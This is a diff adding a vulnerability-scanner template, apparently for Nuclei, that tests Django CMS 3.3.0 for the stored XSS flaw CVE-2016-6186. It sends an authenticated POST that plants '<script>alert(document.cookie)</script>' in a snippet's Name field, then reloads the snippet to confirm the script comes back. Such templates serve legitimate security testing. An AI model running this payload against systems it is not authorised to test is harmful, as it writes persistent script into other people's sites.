@@ -1,0 +1,59 @@
+id: django-cms-v3-3-0-persistent-xss
+info:
+  name: Django CMS v3.3.0 Persistent XSS Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    A persistent XSS vulnerability in Django CMS v3.3.0 allows remote attackers to inject malicious script code through the `Name` field in the Snippets module. This script is executed when the snippet is loaded in the options listing.
+  reference:
+    - http://www.vulnerability-lab.com/get_content.php?id=1869
+    - https://www.djangoproject.com/weblog/2016/jul/18/security-releases/
+    - http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6186
+  tags: xss,persistent,django-cms,intrusive
+
+http:
+  - raw:
+      - |
+        POST /en/admin/djangocms_snippet/snippet/add/?_to_field=id&_popup=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------30880199939743
+        Cookie: csrftoken=LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm; sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21;
+        
+        -----------------------------30880199939743
+        Content-Disposition: form-data; name="csrfmiddlewaretoken"
+        
+        LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm
+        -----------------------------30880199939743
+        Content-Disposition: form-data; name="name"
+        
+        <script>alert(document.cookie)</script>
+        -----------------------------30880199939743--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.cookie)</script>"
+    extractors:
+      - type: regex
+        name: snippet_id
+        part: body
+        regex:
+          - "snippet/([0-9]+)/\\?_to_field"
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /en/admin/djangocms_snippet/snippet/{{snippet_id}}/?_to_field=id&_popup=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: csrftoken=LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm; sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21;
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.cookie)</script>"
